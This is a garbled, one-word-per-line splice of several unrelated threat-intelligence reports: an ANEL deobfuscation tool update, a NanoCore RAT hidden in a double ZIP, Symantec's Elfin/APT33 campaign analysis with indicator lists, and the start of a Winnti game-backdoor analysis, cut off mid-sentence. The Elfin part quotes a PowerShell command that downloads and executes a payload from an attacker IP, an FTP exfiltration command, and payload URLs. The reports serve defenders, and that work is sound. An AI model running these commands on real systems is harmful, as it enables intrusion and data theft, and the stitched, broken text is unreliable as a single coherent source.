case
,
block
comparison
variable
is
searched
in
each
block
of
endsWithJcc
and
nonJcc
.
 
If
the
next
block
is
resolved
,
the
CFG
(
specifically
mblock_t
:
:p
redset
and
mblock_t
:
:s
uccset
)
and
the
destination
of
goto
jump
instruction
are
updated
.
 
The
code
tracks
the
block
comparison
variable
in
each
predecessor
and
more
(
if
any
conditional
blocks
before
the
predecessor
)
to
identify
each
next
block
for
unflattening
.
 
And
,
in
the
third
case
that
was
implemented
,
the
block
comparison
variables
are
not
assigned
in
the
flattened
blocks
but
rather
the
first
blocks
according
to
a
condition
.
 
For
example
,
the
following
microcode
graph
shows
edi
is
assigned
to
esi
(
the
block
comparison
variable
in
this
case
)
in
block
number
7
but
the
edi
value
is
assigned
in
block
number
1
and
2
.
 
If
the
immediate
value
for
block
comparison
variable
is
not
found
in
the
flattened
blocks
,
the
new
code
tries
to
trace
the
first
blocks
to
obtain
the
value
and
reconnects
block
number
1
and
2
as
successors
of
block
number
7
,
in
addition
to
normal
operations
mentioned
in
the
original
cases
.
 
In
this
case
,
the
code
parses
the
structure
in
first
blocks
then
reconnects
each
conditional
blocks
under
the
flattened
blocks
(
#1
and
#2
as
successors
of
#13
,
#3
and
#4
as
successors
of
#11
)
.
 
Last
,
but
not
least
,
in
all
cases
explained
here
,
the
tail
instruction
of
the
dispatcher
predecessor
can
be
a
conditional
jump
like
jnz
,
not
just
goto
.
 
The
modified
code
checks
the
tail
instruction
and
if
the
true
case
destination
is
a
control
flow
dispatcher
,
it
updates
the
CFG
and
the
destination
of
the
instruction
.
 
The
following
changes
are
minor
compared
with
above
referenced
ones
.
 
Additional
jump
instructions
are
supported
when
collecting
block
comparison
variable
candidates
and
mapping
between
the
variable
and
ea
or
block
number
(
jnz/jle
in
JZCollector
,
jnz
in
JZMapper
)
.
 
An
entropy
threshold
adjustment
due
to
check
in
high
maturity
level
.
 
Multiple
block
tracking
for
getting
block
comparison
variable
.
 
And
the
last
change
that
was
introduced
in
regards
to
the
block
update
variable
referred
in
the
overview
.
 
Some
functions
in
the
ANEL
sample
utilize
this
,
however
the
assignment
is
a
little
bit
tricky
.
 
By
using
the
and
instruction
,
the
immediate
values
used
in
comparison
look
different
from
assigned
ones
.
 
The
modified
code
will
consider
this
.
 
The
modified
tool
was
tested
with
an
ANEL
5.4.1
payload
dropped
from
a
malicious
document
with
the
following
hash
(
previously
reported
by
FireEye
)
:
3d2b3c9f50ed36bef90139e6dd250f140c373664984b97a97a5a70333387d18d
.
 
The
code
is
able
to
deobfuscate
34
of
38
functions
(
89%
)
.
 
It
should
be
noted
every
function
is
not
always
obfuscated
.
 
The
failure
examples
are
:
Not
yet
implemented
cases
(
e.g
,
a
conditional
jump
of
the
dispatcher
predecessors
tail
instruction
in
goto
N
predecessors
case
,
consecutive
if-statement
flattened
blocks
)
.
 
An
incorrect
choice
of
control
flow
dispatcher
and
first
block
(
algorithm
error
)
.
 
These
fixes
will
be
prioritized
for
future
releases
.
 
Additionally
there
is
a
known
issue
with
the
result
(
e.g
,
the
remaining
loop
or
paradoxical
decompiled
code
)
,
using
the
following
IDAPython
command
in
Output
window
:
idc.load_and_run_plugin
(
HexRaysDeob
,
0xdead
)
.
 
The
command
will
instruct
the
code
to
execute
only
opaque
predicates
deobfuscation
in
the
current
selected
function
.
 
This
allows
an
analyst
to
quickly
check
if
there
are
any
lost
blocks
by
control
flow
unflattening
.
 
After
the
check
,
the
original
result
can
be
restored
by
using
the
following
command
:
idc.load_and_run_plugin
(
HexRaysDeob
,
0xf001
)
.
 
The
compiler-level
obfuscations
like
opaque
predicates
and
control
flow
flattening
are
started
to
be
observed
in
the
wild
by
analyst
and
researchers
.
 
Currently
malware
with
the
obfuscations
is
limited
,
however
TAU
expects
not
only
APT10
but
also
other
threat
actors
will
start
to
use
them
.
 
Unfortunately
,
in
order
to
break
the
techniques
we
have
to
understand
both
of
the
obfuscation
mechanisms
and
disassembler
tool
internals
before
we
can
automate
the
process
.
 
TAU
modified
the
original
HexRaysDeob
to
make
it
work
for
APT10
ANEL
obfuscations
.
 
The
modified
code
is
available
publically
here
.
 
The
summary
of
the
modifications
is
:
New
patterns
and
data-flow
tracking
for
opaque
predicates
.
 
Analysis
in
multiple
maturity
levels
,
considering
multiple
control
flow
dispatchers
and
various
jump
cases
for
control
flow
flattening
.
 
The
tool
can
work
for
almost
all
obfuscated
functions
in
the
tested
sample
.
 
This
implementation
will
deobfuscate
approximately
89%
of
encountered
functions
.
 
This
provides
researchers
and
analyst
broad
tool
to
attack
this
type
of
obfuscation
,
and
if
it
adopted
in
other
families
.
 
In
should
be
noted
that
the
tool
may
not
work
for
the
updated
versions
of
ANEL
if
they
are
compiled
with
different
options
of
the
obfuscating
compiler
.
 
Testing
in
multiple
versions
is
important
,
so
TAU
is
looking
for
newer
versions
ANEL
samples
.
 
Please
reach
out
to
our
unit
if
you
have
relevant
samples
or
need
assistance
in
deobfuscating
the
codes
.
 
Double
Loaded
Zip
File
Delivers
Nanocore
Most
malware
sent
via
emails
is
packaged
in
archives
such
as
ZIP,
RAR,
and
7z
(7-Zip
)
.
 
Occasionally,
we
encounter
some
clever
and
creative
ways
these
malicious
archives
are
crafted
.
 
Here
we
will
examine
an
example
of
an
oddly
formatted
ZIP
archive
hiding
the
NanoCore
malware
.
 
We
spotted
a
courier
themed
spam
campaign
on
our
Secure
Email
Gateway
(SEG
)
cloud
recently
.
 
The
message
claimed
to
be
from
an
Export
Operation
Specialist
of
USCO
Logistics
and
that
it
was
sent
as
per
their
customer
request
.
 
Aside
from
this,
there
were
several
other
suspicious
items
we
noted:
Headers
mismatched:
The
Reply-To
and
From
email
address
were
different
.
 
Furthermore,
the
email
address
used
in
Reply-To
is
from
a
free
email
client
Gmail
.
 
Suspicious
message
body:
The
attachment
was
mentioned
in
the
message
body
twice,
making
sure
to
direct
the
readers
attention
towards
the
attachment
.
 
Suspicious
attachment
name:
The
name
of
attachment
SHIPPING_MX00034900_PL_INV_pdf.zip
ends
with
pdf.zip
.
 
That
usually
means
that
the
name
of
the
file
inside
the
archive
ends
with
2
known
file
extensions
pdf.<extension>
(archiving
tools
usually
defaults
the
<extension>
to
the
archives
format
e.g.
zip
)
.
 
The
attachment
SHIPPING_MX00034900_PL_INV_pdf.zip
makes
this
message
stand
out
.
 
The
ZIP
file
had
a
file
size
significantly
greater
than
that
of
its
uncompressed
content
.
 
Typically,
the
size
of
the
ZIP
file
should
be
less
than
the
uncompressed
content
or,
in
some
cases,
ZIP
files
will
grow
larger
than
the
original
files
by
a
reasonable
number
of
bytes
.
 
ZIP
archives
are
supposed
to
have
one
End
of
Central
Directory
(EOCD)
signifying
the
end
of
the
archive
.
 
Looking
deeper
into
the
structure
of
SHIPPING_MX00034900_PL_INV_pdf.zip
,
the
attachment
has
two
EOCDs
.
 
After
the
first
EOCD
comes
some
extra
data
another
ZIP
file
structure
.
 
It
turns
out
that
the
first
ZIP
structure
is
for
the
image
file
order.jpg
while
the
second
one
is
for
an
executable
file
SHIPPING_MX00034900_PL_INV_pdf.exe
.
 
Both
are
compressed
when
archived,
and
both
indicate
that
they
are
the
only
file
in
their
ZIP
structures
as
indicated
in
their
local
file
headers
and
EOCDs
respectively
.
 
The
image
file
order.jpg
contained
in
the
first
ZIP
structure
is
actually
a
non-malicious
PNG
formatted
image
file
.
 
This
serves
as
a
decoy,
an
attempt
to
hide
the
content
of
the
other
ZIP
structure
.
 
The
image
file
has
been
correctly
identified
by
SEG
as
a
PNG
when
its
file
extension
is
.jpg
denoting
a
JPEG
formatted
image
.
 
The
second
ZIP
structure
contains
SHIPPING_MX00034900_PL_INV_pdf.exe
,
which
is
a
NanoCore
RAT
.
 
This
remote
access
Trojan
has
the
capability
that
allows
an
attacker
to
completely
take
control
of
the
compromised
machine
.
 
It
connects
to
its
command
and
control
server
at
194.5.98.85
on
port
11903
.
 
This
NanoCore
RAT
is
version
1.2.2.0
which
has
been
found
to
be
offered
for
free
on
the
Dark
Web
just
a
few
months
ago
.
 
We
used
different
archiving
tools
such
as
PowerArchiver
2019
,
WinZip
,
WinRar
,
7Zip
,
and
unzIP
that
is
built
into
the
Windows
OS
in
attempting
to
extract
the
content
of
the
attachment
SHIPPING_MX00034900_PL_INV_pdf.zip
.
 
Among
these
5
tools,
only
WinZip
and
Windows
unzIP
were
not
able
to
extract
anything
from
the
ZIP
file
as
they
encountered
an
error
at
the
start
of
the
extraction
process
.
 
The
other
archiving
tools
were
able
to
extract
one
file
from
the
ZIP
attachment
either
order.jpg
or
SHIPPING_MX00034900_PL_INV_pdf.exe
.
 
WinZip
version
11.2
and
24.0,
and
the
built-in
unzIP
tool
in
Windows
,
recognized
that
the
attachment
SHIPPING_MX00034900_PL_INV_pdf.zip
is
an
invalid
archive
.
 
Only
WinZip
gave
an
explicit
reason
the
start
of
central
directory
of
the
ZIP
was
not
found
.
 
The
central
directory
it
pertained
to
is
the
one
in
the
second
ZIP
structure
.
 
At
figure
2,
the
second
EOCD
indicates
that
its
only
central
directory
is
located
at
file
offset
0xd148f
whereas
it
is
at
0xd40d41.
(The
size
of
the
first
ZIP
structure
was
not
considered.)
Meanwhile,
the
archiving
tools
PowerArchiver
2019
,
WinRar
,
and
7Zip
were
able
to
extract
a
file
from
the
attachment
SHIPPING_MX00034900_PL_INV_pdf.zip
.
 
The
latest
versions
of
PowerArchiver
2019
and
WinRar
displayed
in
their
respective
UI
the
executable
SHIPPING_MX00034900_PL_INV_pdf.exe
as
the
only
content
of
the
ZIP
attachment
.
 
No
error
or
warning
was
prompted
during
the
extraction
.
 
Older
versions
of
7Zip
also
behave
like
PowerArchiver
and
WinRAR
.
 
7Zip
version
9.22
and
older
saw
the
executable
as
well
.
 
However,
starting
from
7Zip
version
9.34
(next
available
installer
after
version
9.22)
up
to
its
latest
version
19.0,
7zip
saw
and
was
able
to
extract
the
image
file
order.jpg
instead
.
 
The
second
ZIP
structure
was
treated
as
extra
data;
hence,
a
warning
was
added
to
the
extracted
image
files
properties
.
 
Among
the
archiving
tools
we
tried,
WinRar
3.30
behaved
differently
and
unexpectedly
.
 
The
content
of
the
ZIP
attachment
it
displayed
in
its
UI
was
not
the
one
it
extracted!
This
sample
challenges
gateways
scanners
.
 
Depending
on
the
type
of
decompression
engine
used,
there
is
a
good
probability
that
only
the
decoy
file
may
be
scrutinized
and
vetted,
and
the
malicious
content
unnoticed
just
like
how
some
of
the
most
popular
archiving
tools
failed
to
notice
the
second
ZIP
structure
.
 
Despite
what
the
gateway
does,
this
attack
would
only
succeed
if
the
message
got
through
the
gateway
and
a
particular
archive
utility
is
used
by
the
end-user,
such
as
certain
versions
of
PowerArchiver
,
WinRar
,
and
older
7Zip
as
described
above
.
 
In
this
case,
the
Trustwave
Secure
email
Gateway
flagged
the
message
as
suspicious
and
it
did
not
get
through
.
 
Nevertheless,
this
case
does
highlight
the
types
of
tricks
the
bad
guys
are
using
in
an
attempt
to
deliver
malware
through
email
.
 
SHIPPING_MX00034900_PL_INV_pdf.zip
:
9474e1517c98d4165300a49612888d16643efbf6
.
 
Elfin
:
Relentless
Espionage
Group
Targets
Multiple
Organizations
in
Saudi
Arabia
and
U.S
.
 
The
Elfin
espionage
group
(
aka
APT33
)
has
remained
highly
active
over
the
past
three
years
,
attacking
at
least
50
organizations
in
Saudi
Arabia
,
the
United
States
,
and
a
range
of
other
countries
.
 
The
group
,
which
first
became
active
in
late
2015
or
early
2016
,
specializes
in
scanning
for
vulnerable
websites
and
using
this
to
identify
potential
targets
,
either
for
attacks
or
creation
of
command
and
control
(
C&C
)
infrastructure
.
 
It
has
compromised
a
wide
range
of
targets
,
including
governments
along
with
organizations
in
the
research
,
chemical
,
engineering
,
manufacturing
,
consulting
,
finance
,
telecoms
,
and
several
other
sectors
.
 
Elfin
continues
to
be
focused
heavily
on
Saudi
Arabia
,
which
accounted
for
42
percent
of
attacks
observed
by
Symantec
since
the
beginning
of
2016
.
 
However
,
the
U.S.
has
also
been
a
country
of
significant
interest
to
the
group
,
with
18
organizations
attacked
over
the
past
three
years
,
including
a
number
of
Fortune
500
companies
.
 
Elfin
targets
in
the
U.S.
have
included
organizations
in
the
engineering
,
chemical
,
research
,
energy
consultancy
,
finance
,
IT
,
and
healthcare
sectors
.
 
Some
of
these
U.S.
organizations
may
have
been
targeted
by
Elfin
for
the
purpose
of
mounting
supply
chain
attacks
.
 
In
one
instance
,
a
large
U.S.
company
was
attacked
in
the
same
month
a
Middle
Eastern
company
it
co-owns
was
also
compromised
.
 
In
a
recent
wave
of
attacks
during
February
2019
,
Elfin
attempted
to
exploit
a
known
vulnerability
(
CVE-2018-20250
)
in
WinRAR
,
the
widely
used
file
archiving
and
compression
utility
capable
of
creating
self-extracting
archive
files
.
 
The
exploit
was
used
against
one
target
in
the
chemical
sector
in
Saudi
Arabia
.
 
If
successfully
exploited
on
an
unpatched
computer
,
the
vulnerability
could
permit
an
attacker
to
install
any
file
on
the
computer
,
which
effectively
permits
code
execution
on
the
targeted
computer
.
 
Two
users
in
the
targeted
organization
received
a
file
called
"
JobDetails.rar
"
,
which
attempted
to
exploit
the
WinRAR
vulnerability
.
 
This
file
was
likely
delivered
via
a
spear-phishing
email
.
 
However
,
prior
to
this
attempted
attack
,
Symantec
had
rolled
out
proactive
protection
against
any
attempt
to
exploit
this
vulnerability
(
Exp.CVE-2018-20250
)
.
 
This
protection
successfully
protected
the
targeted
organization
from
being
compromised
.
 
Elfin
came
under
the
spotlight
in
December
2018
when
it
was
linked
with
a
new
wave
of
Shamoon
attacks
.
 
One
Shamoon
victim
in
Saudi
Arabia
had
recently
also
been
attacked
by
Elfin
and
had
been
infected
with
the
Stonedrill
malware
(
Trojan.Stonedrill
)
used
by
Elfin
.
 
Because
the
Elfin
and
the
Shamoon
attacks
against
this
organization
occurred
so
close
together
,
there
has
been
speculation
that
the
two
groups
may
be
linked
.
 
However
,
Symantec
has
found
no
further
evidence
to
suggest
Elfin
was
responsible
for
these
Shamoon
attacks
to
date
.
 
We
continue
to
monitor
the
activities
of
both
groups
closely
.
 
Elfin
has
deployed
a
wide
range
of
tools
in
its
attacks
including
custom
malware
,
commodity
malware
,
and
open-source
hacking
tools
.
 
Custom
malware
used
by
the
group
include
:
Notestuk
(
Backdoor.Notestuk
)
(
aka
TURNEDUP
)
:
Malware
that
can
be
used
to
open
a
backdoor
and
gather
information
from
a
compromised
computer
.
 
Stonedrill
(
Trojan.Stonedrill
)
:
Custom
malware
capable
of
opening
a
backdoor
on
an
infected
computer
and
downloading
additional
files
.
 
The
malware
also
features
a
destructive
component
,
which
can
wipe
the
master
boot
record
of
an
infected
computer
.
 
AutoIt
backdoor
:
A
custom
built
backdoor
written
in
the
AutoIt
scripting
language
.
 
In
addition
to
its
custom
malware
,
Elfin
has
also
used
a
number
of
commodity
malware
tools
,
available
for
purchase
on
the
cyber
underground
.
 
These
include
:
Remcos
(
Backdoor.Remvio
)
:
A
commodity
remote
administration
tool
(
RAT
)
that
can
be
used
to
steal
information
from
an
infected
computer
.
 
DarkComet
(
Backdoor.Breut
)
:
Another
commodity
RAT
used
to
open
a
backdoor
on
an
infected
computer
and
steal
information
.
 
Quasar
RAT
(
Trojan.Quasar
)
:
Commodity
RAT
that
can
be
used
to
steal
passwords
and
execute
commands
on
an
infected
computer
.
 
Pupy
RAT
(
Backdoor.Patpoopy
)
:
Commodity
RAT
that
can
open
a
backdoor
on
an
infected
computer
.
 
NanoCore
(
Trojan.Nancrat
)
:
Commodity
RAT
used
to
open
a
backdoor
on
an
infected
computer
and
steal
information
.
 
NetWeird
(
Trojan.Netweird.B
)
:
A
commodity
Trojan
which
can
open
a
backdoor
and
steal
information
from
the
compromised
computer
.
 
It
may
also
download
additional
potentially
malicious
files
.
 
Elfin
also
makes
frequent
use
of
a
number
of
publicly
available
hacking
tools
,
including
:
LaZagne
(
SecurityRisk.LaZagne
)
:
A
login/password
retrieval
tool
.
 
Mimikatz
(
Hacktool.Mimikatz
)
:
Tool
designed
to
steal
credentials
.
 
Gpppassword
:
Tool
used
to
obtain
and
decrypt
Group
Policy
Preferences
(
GPP
)
passwords
.
 
SniffPass
(
SniffPass
)
:
Tool
designed
to
steal
passwords
by
sniffing
network
traffic
.
 
In
this
section
,
we
describe
in
detail
an
Elfin
attack
on
a
U.S.
organization
.
 
On
February
12
,
2018
at
16:45
(
all
times
are
in
the
organizations
local
time
)
,
an
email
was
sent
to
the
organization
advertising
a
job
vacancy
at
an
American
global
service
provider
.
 
The
email
contained
a
malicious
link
to
http://mynetwork.ddns.net:880
.
 
The
recipient
clicked
the
link
and
proceeded
to
download
and
open
a
malicious
HTML
executable
file
,
which
in
turn
loaded
content
from
a
C&C
server
via
an
embedded
iframe
.
 
At
the
same
time
,
code
embedded
within
this
file
also
executed
a
powershell
command
to
download
and
execute
a
copy
of
chfeeds.vbe
from
the
C&C
server
.
 
[System.Net.ServicePointManager]
:
:S
erverCertificateValidationCallback={$true};IEX
(New-Object
Net.WebClient
)
.DownloadString
(
'
https://217.147.168.46:8088/index.jpg
'
)
.
 
A
second
JavaScript
command
was
also
executed
,
which
created
a
scheduled
task
to
execute
chfeeds.vbe
multiple
times
a
day
.
 
The
chfeeds.vbe
file
acts
as
a
downloader
and
was
used
to
download
a
second
powershell
script
(
registry.ps1
)
.
 
This
script
in
turn
downloaded
and
executed
a
PowerShell
backdoor
known
as
POSHC2
,
a
proxy-aware
C&C
framework
,
from
the
C&C
server
(
https://
host-manager.hopto.org
)
.
 
Later
at
20:57
,
the
attackers
became
active
on
the
compromised
machine
and
proceeded
to
download
the
archiving
tool
WinRAR
.
 
89.34.237.118
808
http://89.34.237.118:808/Rar32.exe
.
 
At
23:29
,
the
attackers
then
proceeded
to
deploy
an
updated
version
of
their
POSHC2
stager
.
 
192.119.15.35
880
http://mynetwork.ddns.net:880/st-36-p4578.ps1
.
 
This
tool
was
downloaded
several
times
between
23:29
on
February
12
and
07:47
on
February
13
.
 
Two
days
later
,
on
February
14
at
15:12
,
the
attackers
returned
and
installed
Quasar
RAT
onto
the
infected
computer
that
communicated
with
a
C&C
server
(
217.147.168.123
)
.
 
Quasar
RAT
was
installed
to
CSIDL_PROFILE\appdata\roaming\microsoft\crypto\smss.exe
.
 
At
this
point
,
the
attackers
ceased
activity
while
maintaining
access
to
the
network
until
February
21
.
 
At
06:38
,
the
attackers
were
observed
downloading
a
custom
.NET
FTP
tool
to
the
infected
computer
.
 
192.119.15.36
880
http://192.119.15.36:880/ftp.exe
.
 
Later
at
6:56
,
the
attackers
exfiltrated
data
using
this
FTP
tool
to
a
remote
host:
JsuObf.exe
Nup#Tntcommand
-s
CSIDL_PROFILE\appdata\roaming\adobe\rar
-a
ftp://89.34.237.118:2020
-f/[REDACTED]-u[REDACTED]-p[REDACTED]
.
 
Activity
ceased
until
the
attackers
returned
on
March
5
and
were
observed
using
Quasar
RAT
to
download
a
second
custom
AutoIt
FTP
Exfiltration
tool
known
as
FastUploader
from
http://192.119.15.36:880/ftp.exe
.
 
This
tool
was
then
installed
to
csidl_profile\appdata\roaming\adobe\ftp.exe
.
 
FastUploader
is
a
custom
FTP
tool
designed
to
exfiltrate
data
at
a
faster
rate
than
traditional
FTP
clients
.
 
At
this
point
,
additional
activity
from
the
attackers
continued
between
March
5
into
April
,
and
on
April
18
at
11:50
,
a
second
remote
access
tool
known
as
DarkComet
was
deployed
to
csidl_profile\appdata\roaming\microsoft\windows\start
menu\programs\startup\smss.exe
on
the
infected
computer
.
 
This
was
quickly
followed
15
seconds
later
by
the
installation
of
a
credential
dumping
to
csidl_profile\appdata\roaming\microsoft\credentials\dwm32.exe
,
and
the
execution
of
powershell
commands
via
PowerShell
Empire
,
a
freely
available
post-exploitation
framework
,
to
bypass
logging
on
the
infected
machine
.
 
Activity
continued
throughout
April
where
additional
versions
of
DarkComet
,
POSHC2
implants
,
and
an
AutoIt
backdoor
were
deployed
along
with
further
credential
dumping
activities
.
 
Elfin
is
one
of
the
most
active
groups
currently
operating
in
the
Middle
East
,
targeting
a
large
number
of
organizations
across
a
diverse
range
of
sectors
.
 
Over
the
past
three
years
,
the
group
has
utilized
a
wide
array
of
tools
against
its
victims
,
ranging
from
custom
built
malware
to
off-the-shelf
RATs
,
indicating
a
willingness
to
continually
revise
its
tactics
and
find
whatever
tools
it
takes
to
compromise
its
next
set
of
victims
.
 
Symantec
has
the
following
protection
in
place
to
protect
customers
against
these
attacks
,
APT33
:
Backdoor.Notestuk
Trojan.Stonedrill
Backdoor.Remvio
Backdoor.Breut
Trojan.Quasar
Backdoor.Patpoopy
Trojan.Nancrat
Trojan.Netweird.B
Exp.CVE-2018-20250
SecurityRisk.LaZagne
Hacktool.Mimikatz
SniffPass
.
 
APT33
:
5798aefb07e12a942672a60c2be101dc26b01485616713e8be1f68b321747f2f
Notestuk
TURNEDUP
njRAT
and
NanoCore
.
 
APT33
:
a67461a0c14fc1528ad83b9bd874f53b7616cfed99656442fb4d9cdd7d09e449
AutoIt
backdoor
.
 
APT33
:
f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5
Gpppassword
.
 
APT33
:
87e2cf4aa266212aa8cf1b1c98ae905c7bac40a6fc21b8e821ffe88cf9234586
LaZagne
.
 
APT33
:
709df1bbd0a5b15e8f205b2854204e8caf63f78203e3b595e0e66c918ec23951
LaZagne
.
 
APT33
:
a23c182349f17398076360b2cb72e81e5e23589351d3a6af59a27e1d552e1ec0
Quasar
RAT
.
 
APT33
:
0b3610524ff6f67c59281dbf4a24a6e8753b965c15742c8a98c11ad9171e783d
Quasar
RAT
.
 
APT33
:
d5262f1bc42d7d5d0ebedadd8ab90a88d562c7a90ff9b0aed1b3992ec073e2b0
Quasar
RAT
.
 
APT33
:
ae1d75a5f87421953372e79c081e4b0a929f65841ed5ea0d380b6289e4a6b565
Remcos
.
 
APT33
:
e999fdd6a0f5f8d1ca08cf2aef47f5ddc0ee75879c6f2c1ee23bc31fb0f26c70
Remcos
.
 
APT33
:
018360b869d8080cf5bcca1a09eb8251558378eb6479d8d89b8c80a8e2fa328c
Remcos
.
 
APT33
:
367e78852134ef488ecf6862e71f70a3b10653e642bda3df00dd012c4e130330
Remcos
.
 
APT33
:
ea5295868a6aef6aac9e117ef128e9de107817cc69e75f0b20648940724880f3
Remcos
.
 
APT33
:
6401abe9b6e90411dc48ffc863c40c9d9b073590a8014fe1b0e6c2ecab2f7e18
SniffPass
.
 
APT33
:
bf9c589de55f7496ff14187b1b5e068bd104396c23418a18954db61450d21bab
DarkComet
.
 
APT33
:
af41e9e058e0a5656f457ad4425a299481916b6cf5e443091c7a6b15ea5b3db3
DarkComet
.
 
APT33
:
c7a2559f0e134cafbfc27781acc51217127a7739c67c40135be44f23b3f9d77b
AutoIt
FTP
tool
.
 
APT33
:
99c1228d15e9a7693d67c4cb173eaec61bdb3e3efdd41ee38b941e733c7104f8
.NET
FTP
tool
.
 
APT33
:
94526e2d1aca581121bd79a699a3bf5e4d91a4f285c8ef5ab2ab6e9e44783997
PowerShell
downloader
(
registry.ps1
)
.
 
APT33
:
dedfbc8acf1c7b49fb30af35eda5e23d3f7a202585a5efe82ea7c2a785a95f40
POSHC2
backdoor
.
 
APT33
:
95.211.191.117
update-sec.com
.
 
APT33
:
8.26.21.120
mynetwork.ddns.net
.
 
APT33
:
162.250.145.234
mynetwork.ddns.net
.
 
APT33
:
91.235.142.76
mywinnetwork.ddns.net
.
 
APT33
:
8.26.21.119
hyperservice.ddns.net
.
 
APT33
:
8.26.21.120
[REDACTED].ddns.net
.
 
APT33
:
213.252.244.14
service-avant.com
.
 
APT33
:
91.235.142.124
mywinnetwork.ddns.net
.
 
APT33
:
8.26.21.120
mynetwork.ddns.net
.
 
APT33
:
162.250.145.234
mynetwork.ddns.net
.
 
APT33
:
91.235.142.76
mywinnetwork.ddns.net
.
 
APT33
:
8.26.21.120
[REDACTED].ddns.net
.
 
APT33
:
8.26.21.120
[REDACTED].ddns.net
.
 
APT33
:
95.211.191.117
update-sec.com
.
 
APT33
:
5.187.21.70
microsoftupdated.com
.
 
APT33
:
217.13.103.46
securityupdated.com
.
 
APT33
:
8.26.21.120
[REDACTED].ddns.net
.
 
APT33
:
5.187.21.71
backupnet.ddns.net
.
 
APT33
:
91.230.121.143
backupnet.ddns.net
.
 
APT33
:
8.26.21.119
[REDACTED].ddns.net
.
 
APT33
:
8.26.21.117
srvhost.servehttp.com
.
 
APT33
:
37.48.105.178
servhost.hopto.org
.
 
APT33
:
8.26.21.117
srvhost.servehttp.com
.
 
APT33
:
5.187.21.70
microsoftupdated.com
.
 
APT33
:
64.251.19.214
mynetwork.ddns.net
.
 
APT33
:
64.251.19.217
[REDACTED].servehttp.com
.
 
APT33
:
64.251.19.214
[REDACTED].ddns.net
.
 
APT33
:
64.251.19.214
mynetwork.ddns.net
.
 
APT33
:
64.251.19.214
[REDACTED].sytes.net
.
 
APT33
:
64.251.19.217
[REDACTED].myftp.org
.
 
APT33
:
64.251.19.216
srvhost.servehttp.com
.
 
APT33
:
64.251.19.217
[REDACTED].myftp.org
.
 
APT33
:
64.251.19.217
[REDACTED].myftp.org
.
 
APT33
:
64.251.19.215
[REDACTED].myftp.org
.
 
APT33
:
64.251.19.217
[REDACTED].myftp.org
.
 
APT33
:
64.251.19.216
[REDACTED].myftp.org
.
 
APT33
:
64.251.19.232
mynetwork.ddns.net
.
 
APT33
:
64.251.19.214
[REDACTED].ddns.net
.
 
APT33
:
162.250.145.204
mynetwork.ddns.net
.
 
APT33
:
188.165.4.81
svcexplores.com
.
 
APT33
:
64.251.19.231
mynetwork.ddns.net
.
 
APT33
:
64.251.19.231
[REDACTED].ddns.net
.
 
APT33
:
64.251.19.232
[REDACTED].ddns.net
.
 
APT33
:
64.251.19.216
[REDACTED].myftp.biz
.
 
APT33
:
91.230.121.143
remote-server.ddns.net
.
 
APT33
:
162.250.145.222
[REDACTED].ddns.net
.
 
APT33
:
64.251.19.216
[REDACTED].redirectme.net
.
 
APT33
:
8.26.21.222
mynetwork.ddns.net
.
 
APT33
:
8.26.21.223
[REDACTED].ddns.net
.
 
APT33
:
217.147.168.44
remserver.ddns.net
.
 
APT33
:
195.20.52.172
mynetwork.cf
.
 
APT33
:
8.26.21.221
mynetwork.ddns.net
.
 
APT33
:
8.26.21.220
[REDACTED].ddns.net
.
 
APT33
:
8.26.21.221
[REDACTED].ddns.net
.
 
APT33
:
91.230.121.144
remserver.ddns.net
.
 
APT33
:
89.34.237.118
mywinnetwork.ddns.net
.
 
APT33
:
192.119.15.35
mynetwork.ddns.net
.
 
APT33
:
5.79.127.177
mypsh.ddns.net
.
 
APT33
:
192.119.15.35
[REDACTED].ddns.net
.
 
APT33
:
192.119.15.35
[REDACTED].ddns.net
.
 
APT33
:
192.119.15.35
[REDACTED].ddns.net
.
 
APT33
:
192.119.15.36
[REDACTED].ddns.net
.
 
APT33
:
192.119.15.37
mynetwork.ddns.net
.
 
APT33
:
192.119.15.38
[REDACTED].ddns.net
.
 
APT33
:
192.119.15.39
remote-server.ddns.net
.
 
APT33
:
192.119.15.40
[REDACTED].ddns.net
.
 
APT33
:
192.119.15.41
mynetwork.cf
.
 
APT33
:
192.119.15.42
[REDACTED].ddns.net
.
 
gaming
industry
scope
attackers
asia
.
 
This
is
not
the
first
time
the
gaming
industry
has
been
targeted
by
attackers
who
compromise
game
developers
,
insert
backdoors
into
a
games
build
environment
,
and
then
have
their
malware
distributed
as
legitimate
software
.
 
In
April
2013
,
Kaspersky
Lab
reported
that
a
popular
game
was
altered
to
include
a
backdoor
in
2011
.
 
That
attack
was
attributed
to
perpetrators
Kaspersky
called
the
Winnti
Group
.
 
Yet
again
,
new
supply-chain
attacks
recently
caught
the
attention
of
ESET
Researchers
.
 
This
time
,
two
games
and
one
gaming
platform
application
were
compromised
to
include
a
backdoor
.
 
Given
that
these
attacks
were
mostly
targeted
against
Asia
and
the
gaming
industry
,
it
shouldnt
be
surprising
they
are
the
work
of
the
group
described
in
Kaspersky
s
Winnti
More
than
just
a
game
.
 
Although
the
malware
uses
different
configurations
in
each
case
,
the
three
affected
software
products
included
the
same
backdoor
code
and
were
launched
using
the
same
mechanism
.
 
While
two
of
the
compromised
products
no
longer
include
the
backdoor
,
one
of
the
affected
developers
is
still
distributing
the
trojanized
version
:
ironically
,
the
game
is
named
Infestation
,
and
is
produced
by
Thai
developer
Electronics
Extreme
.
 
We
have
tried
informing
them
several
times
,
through
various
channels
,
since
early
February
,
but
without
apparent
success
.
 
Lets
look
at
how
the
malicious
payload
is
embedded
and
then
look
into
the
details
of
the
backdoor
itself
.
 
The
payload
code
is
started
very
early
during
the
execution
of
the
backdoored
executable
file
.
 
Right
after
the
PE
entry
point
,
the
standard
call
to
the
C
Runtime
initialization
(
__scrt_common_main_seh
)
is
hooked
to
launch
the
malicious
payload
before
everything
else
.
 
This
may
suggest
that
the
malefactor
changed
a
build
configuration
rather
than
the
source
code
itself
.
 
The
code
added
to
the
executable
decrypts
and
launches
the
backdoor
in-memory
before
resuming
normal
execution
of
the
C
Runtime
initialization
code
and
all
the
subsequent
code
of
the
host
application
.
 
The
embedded
payload
data
has
a
specific
structure
,
that
is
parsed
by
the
added
unpacking
code
.
 
It
includes
an
RC4
key
(
which
is
XORed
with
0x37
)
that
is
used
to
decrypt
a
filename
and
the
embedded
DLL
file
.
 
The
actual
malicious
payload
is
quite
small
and
only
contains
about
17
KB
of
code
and
data
.
 
The
configuration
data
is
simply
a
whitespace-separated
list
of
strings
.
 
The
configuration
consists
of
four
fields
:
C&C
server
URL
.
 
Variable
(
t
)
used
to
determine
the
time
to
sleep
in
milliseconds
before
continuing
the
execution
.
 
Wait
time
is
chosen
randomly
in
the
range
2/3
t
to
5/3
t
